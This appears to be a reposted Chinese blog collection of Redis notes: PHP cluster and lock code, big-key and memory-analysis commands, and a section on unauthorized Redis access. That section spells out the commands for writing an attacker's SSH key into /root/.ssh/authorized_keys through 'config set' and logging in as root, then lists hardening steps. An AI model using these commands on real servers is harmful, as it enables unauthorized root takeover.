        if (!$redis->_connected) {
            $redis->connect($redis->_host, $redis->_port);
            $redis->_connected = true;
        }
        // return $redis->$method(...$args); // PHP 5.6
        return call_user_func_array([$redis, $method], $args);
    }
}

$rc = new RedisCluster();
$rc->addServer("127.0.0.1", 8000);
$rc->addServer("127.0.0.1", 8001);
https://learnku.com/articles/32153
$rc->set("a", 1);
$rc->set("b", 2);
$rc->set("c", 3);
$rc->set("d", 4);
$rc->set("e", 5);
```
### 获取大 key
```
redis-cli -h 127.0.0.1 -p 7001 –-bigkeys 也可以追加一个休眠参数，防止在查询过程 ops 暴增，使用此命令：redis-cli -h 127.0.0.1 -p 7001–-bigkeys -i 0.1
https://github.com/leonchen83/redis-rdb-cli
```
### redis锁
```
// 如果获取到锁，则执行 $callback 回调
public function get($callback = null)
{
    $result = $this->acquire();

    if ($result && is_callable($callback)) {
        return tap($callback(), function () {
            $this->release();
        });
    }

    return $result;
}

// 如果获取到锁，则执行 $callback 回调
// 如果没有获取到锁，会等待250毫秒，继续去获取锁
// 如果在 $seconds 秒之内还没有获取到锁，会抛出 LockTimeoutException 异常
public function block($seconds, $callback = null)
{
    $starting = $this->currentTime();

    while (! $this->acquire()) {
        usleep(250 * 1000);

        if ($this->currentTime() - $seconds >= $starting) {
            throw new LockTimeoutException;
        }
    }

    if (is_callable($callback)) {
        return tap($callback(), function () {
            $this->release();
        });
    }

    return true;
}
class RedisLock extends Lock
{
    /**
     * The Redis factory implementation.
     *
     * @var \Illuminate\Redis\Connections\Connection
     */
    protected $redis;

    /**
     * Create a new lock instance.
     *
     * @param  \Illuminate\Redis\Connections\Connection  $redis
     * @param  string  $name
     * @param  int  $seconds
     * @return void
     */
    public function __construct($redis, $name, $seconds)
    {
        parent::__construct($name, $seconds);

        $this->redis = $redis;
    }

    /**
     * Attempt to acquire the lock.
     *
     * @return bool
     */
    public function acquire()
    {
        $result = $this->redis->setnx($this->name, 1);

        if ($result === 1 && $this->seconds > 0) {
            $this->redis->expire($this->name, $this->seconds);
        }

        return $result === 1;
    }

    /**
     * Release the lock.
     *
     * @return void
     */
    public function release()
    {
        $this->redis->del($this->name);
    }
}
https://learnku.com/articles/33111
```
### Redis 未授权访问配合
```
部分 Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。
利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。

Redis 暴露在公网（即绑定在0.0.0.0:6379，目标IP公网可访问），并且没有开启相关认证和添加相关安全策略情况下可受影响而导致被利用。
ssh-keygen –t rsa
将公钥写入 foo.txt 文件
$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt


$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit

$ redis-cli -h 192.168.1.11

$ 192.168.1.11:6379> config set dir /root/.ssh/

OK

$ 192.168.1.11:6379> config get dir

1) "dir"

2) "/root/.ssh"

$ 192.168.1.11:6379> config set dbfilename "authorized_keys"

OK

$ 192.168.1.11:6379> save

OK
这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里，然后攻击者直接执行：

$ ssh –i  id_rsa root@192.168.1.11
即可远程利用自己的私钥登录该服务器。
当然，写入的目录不限于 /root/.ssh 下的authorized_keys，也可以写入用户目录，不过 Redis 很多以 root 权限运行，所以写入 root 目录下，可以跳过猜用户的步骤。
可以使用Pocsuite（http://github.com/knownsec/pocsuite）执行以下的代码可以用于测试目标地址是否存在未授权的Redis服务。

https://www.waitalone.cn/redis-unauthorized-of-expolit.html
配置bind选项，限定可以连接Redis服务器的IP，修改 Redis 的默认端口6379
配置认证，也就是AUTH，设置密码，密码会以明文方式保存在Redis配置文件中
配置rename-command 配置项 “RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度
好消息是Redis作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config
```
### Redis 查看所有 key 的 value 值所占内存大小
```
https://github.com/sripathikrishnan/redis-rdb-tools#generate-memory-report
$ pip install rdbtools python-lzf
$ git clone https://github.com/sripathikrishnan/redis-rdb-tools
$ cd redis-rdb-tools
$ sudo python setup.py install

接下来找到 redis 的 dump.rdb 位置

首先定位到 redis.conf 位置

$ whereis redis.conf
redis: /etc/redis.conf
$ cat /etc/redis.conf | grep dir | grep redis
dir /var/lib/redis
$ cat /etc/redis.conf | grep dump.rdb
dbfilename dump.rdb
综上，得知其路径为：/var/lib/redis/dump.rdb

按内存值导出 csv

$ rdb -c memory /var/lib/redis/dump.rdb > /tmp/redis.csv
https://learnku.com/articles/33211
```

转自：https://sushengbuhuo.github.io/2019/03/26/redis-%E8%AE%B0%E5%BD%95/



